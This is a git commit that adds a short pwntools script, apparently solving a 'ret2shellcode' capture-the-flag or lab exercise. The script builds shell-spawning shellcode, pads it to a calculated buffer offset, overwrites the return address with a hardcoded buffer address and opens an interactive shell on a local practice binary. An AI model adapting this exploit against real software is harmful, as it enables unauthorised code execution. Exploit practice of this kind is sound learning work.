795f9a5ccdbf2361a73265cf601f95421d774600
tangjiaping <tjp@qq.com>
2023-04-15 22:43:42 +0800

    finish ret2shellcode

---
+++ ret2shellcode/test.py
@@ -0,0 +1,26 @@
+##coding=utf8
+from pwn import *
+## 构造与程序交互的对象
+
+def main():
+
+    sh = process('./ret2shellcode')
+
+    buf_addr = 0x0804A080
+
+    shellcode = asm(shellcraft.sh())
+
+    offset = 0xffffd028 - 0xffffcfbc + 4
+
+    ## 构造payload
+    payload = shellcode.decode('unicode_escape') + 'A' * (offset - len(shellcode)) + p32(buf_addr).decode('unicode_escape')
+    print (payload)
+
+    ## 向程序发送字符串
+    sh.sendline(payload)
+
+
+    sh.interactive()
+
+if __name__ == "__main__":
+    main()
